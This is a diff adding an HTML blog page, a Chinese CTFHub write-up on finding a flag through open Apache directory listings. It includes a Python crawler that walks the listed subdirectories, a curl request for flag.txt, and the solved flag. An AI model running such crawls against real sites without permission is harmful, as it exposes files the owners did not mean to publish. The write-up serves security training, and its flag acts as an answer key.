@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 目录遍历 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 信息泄露 - 目录遍历</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 信息泄露</span>
+            <span class="tag"># 目录遍历</span>
+            <span class="tag"># Python</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>目录遍历</li>
+            <li><strong>题目方向：</strong>Web - 信息泄露</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>遍历 <code>flag_in_here/</code> 下的多级目录，定位并读取 <code>flag.txt</code>。</li>
+        </ul>
+
+        <h2>二、解题工具</h2>
+        <ul>
+            <li>浏览器：查看目录索引并逐级访问目录。</li>
+            <li>Python 3：自动请求页面、解析目录链接并进行广度优先遍历。</li>
+            <li>cURL：验证目标文件并读取 Flag。</li>
+        </ul>
+
+        <h2>三、解题思路与步骤</h2>
+        <ol>
+            <li>
+                <strong>访问题目入口：</strong>首页标题为“目录遍历”，页面中提供一个指向 <code>flag_in_here/</code> 的按钮，点击后进入目标目录。
+            </li>
+            <li>
+                <strong>识别目录索引：</strong>访问 <code>/flag_in_here/</code> 后，服务器返回 Apache Directory Index。当前目录包含 <code>1/</code>、<code>2/</code>、<code>3/</code>、<code>4/</code> 四个子目录，但没有直接显示 Flag。
+            </li>
+            <li>
+                <strong>分析目录结构：</strong>进入任意一级目录后，下一层仍然包含多个数字目录。由于目录存在多层和多个分支，手动点击效率较低，因此使用广度优先搜索遍历全部目录。
+            </li>
+            <li>
+                <strong>自动化遍历目录：</strong>脚本请求每个目录页面，使用正则表达式提取其中的 <code>href</code>。目录链接加入队列，文件链接则下载并检查内容：
+                <pre>import re
+import urllib.parse
+import urllib.request
+
+base = "http://challenge-xxx.sandbox.ctfhub.com:10800/flag_in_here/"
+queue = [base]
+seen = {base}
+
+while queue:
+    url = queue.pop(0)
+    html = urllib.request.urlopen(url, timeout=10).read().decode("utf-8", "replace")
+
+    for href in re.findall(r'href="([^"]+)"', html):
+        if href.startswith("?"):
+            continue
+
+        next_url = urllib.parse.urljoin(url, href)
+        if not next_url.startswith(base) or next_url in seen:
+            continue
+
+        seen.add(next_url)
+        if href.endswith("/"):
+            queue.append(next_url)
+        else:
+            data = urllib.request.urlopen(next_url, timeout=10).read().decode("utf-8", "replace")
+            if "ctfhub{" in data:
+                print(f"URL: {next_url}")
+                print(data)
+                raise SystemExit</pre>
+            </li>
+            <li>
+                <strong>定位目标文件：</strong>脚本遍历到 <code>/flag_in_here/3/2/</code> 时，目录索引中出现 <code>flag.txt</code>，其完整路径为：
+                <pre>/flag_in_here/3/2/flag.txt</pre>
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>通过浏览器打开目标文件，或者使用 cURL 请求完整路径：
+                <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/flag_in_here/3/2/flag.txt"</pre>
+                返回内容即为最终 Flag。
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{b3ed95130620ae19d401c444}
+        </div>
+
+        <h2>五、解题总结</h2>
+        <ul>
+            <li><strong>识别目录索引：</strong>Apache Directory Index 会直接列出当前目录下的文件和子目录，是信息泄露题中常见的入口。</li>
+            <li><strong>递归遍历所有分支：</strong>目标文件嵌套在 <code>3/2/</code> 目录中，只检查当前层无法发现，需要遍历完整目录树。</li>
+            <li><strong>使用脚本提高效率：</strong>面对多层、多分支目录时，可以用 Python、wget 或递归爬虫自动解析链接并检测目标文件。</li>
+            <li><strong>注意题目类型：</strong>本题是利用目录索引进行信息收集，并不是通过 <code>../</code> 利用路径穿越漏洞。</li>
+        </ul>
+    </div>
+</body>
+</html>
